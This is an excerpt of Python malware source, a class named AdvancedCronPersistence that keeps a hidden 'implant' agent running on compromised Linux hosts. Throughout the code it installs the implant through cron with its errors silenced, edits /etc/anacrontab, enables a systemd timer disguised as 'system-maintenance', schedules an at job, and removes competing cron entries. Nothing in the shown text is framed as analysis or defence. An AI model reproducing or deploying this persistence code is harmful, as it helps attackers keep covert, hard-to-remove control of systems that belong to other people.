...
class AdvancedCronPersistence:
    def __init__(self, hidden_dir=None):
        self.hidden_dir = hidden_dir or os.path.expanduser("~/.cache/.arachne")
        self.implant_path = os.path.join(self.hidden_dir, ".arachne_agent.py")
    ...
    def setup_standard_cron(self):
        ...
        try:
            ...
            cron_command = (
                f"{minute} */{interval} * * * python3 {self.implant_path} 2>/dev/null"
            )
    ...
    def setup_anacron(self):
        ...
        try:
            ...
            # Backup original
            subprocess.call(
                "cp /etc/anacrontab /etc/anacrontab.backup 2>/dev/null", shell=True
            )
...
"""
            ...
            self.persistence_methods.append(
                {"type": "anacron", "timestamp": datetime.now().isoformat()}
            )
...
"""
            ...
            subprocess.call(
                "systemctl enable --now system-maintenance.timer", shell=True
            )
...
"""
            ...
            subprocess.call(
                f'echo "{at_command}" | at now + 1 hour 2>/dev/null', shell=True
            )
    ...
    def clean_competing_crons(self):
        ...
        try:
            ...
            output = subprocess.check_output(
                "crontab -l 2>/dev/null || echo ''", shell=True
            ).decode()
